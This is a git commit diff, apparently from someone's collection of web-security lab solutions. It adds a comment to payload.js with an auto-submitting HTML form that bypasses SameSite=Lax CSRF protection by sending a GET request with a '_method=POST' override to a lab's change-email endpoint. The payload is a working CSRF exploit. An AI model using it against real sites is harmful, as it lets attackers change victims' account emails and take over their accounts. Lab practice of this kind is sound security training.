dd29abed55e7c4c0a121a69333cd56c57cf560ed
senior <jedi>
2023-06-27 17:15:43 +0530

    method spoofing

--- CSRF/SameSite Lax bypass via method override/payload.js
+++ CSRF/SameSite Lax bypass via method override/payload.js
@@ -8,3 +8,23 @@ since GET is not allowed we crafted a URL which would cause a malicious GET requ
 BUT at the end we put the _method parameter to trick the server into thinking its a POST
 BURP doesnt mention the SameSite cookie so LAX by default is beign used
 */
+
+/*
+This will aslo solve the lab
+
+<html>
+<body>
+<form action="https://0a5e002203fbc21680e0cbb500b00096.web-security-academy.net/my-account/change-email" method="GET">
+    <input type="hidden" name="_method" value="POST"/>
+    <input type="hidden" name="email" value="test@test.ess"/>
+    <input type="submit" value="Submit"/>
+</form>
+<script>
+document.forms[0].submit();
+</script>
+</body>
+</html>
+
+
+// the GET method is used in LAX and the POST _method parameter will result in the email change
+*/
